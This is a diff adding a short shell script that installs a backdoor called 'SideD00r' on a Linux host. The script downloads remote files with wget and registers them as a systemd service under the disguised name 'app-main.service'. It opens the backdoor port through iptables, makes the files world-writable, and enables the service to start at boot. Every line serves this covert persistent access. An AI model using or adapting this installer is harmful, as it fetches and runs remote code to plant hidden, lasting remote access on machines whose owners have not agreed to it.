@@ -1,0 +1,15 @@
+# install java
+apt-get install default-jre -y; 
+
+# download persistence files and sided00r.
+wget https://raw.githubusercontent.com/Aaron-Akhtar/SideD00r/main/sided00r.service -O /etc/systemd/system/app-main.service 
+wget https://raw.githubusercontent.com/Aaron-Akhtar/SideD00r/main/start.sh -O /root/.local/start.sh
+
+# SET PORT IN IPTABLES FILE TO THE SIDED00R PORT (900 by default).
+wget https://raw.githubusercontent.com/Aaron-Akhtar/SideD00r/main/iptables.sh -O /root/.local/iptables.sh
+
+# set needed permissions
+chmod 777 /root/.local/iptables.sh /root/.local/start.sh /etc/systemd/system/app-main.service
+
+sudo systemctl enable app-main.service
+# if you want to start the sided00r, type "sudo systemctl start app-main.service" 
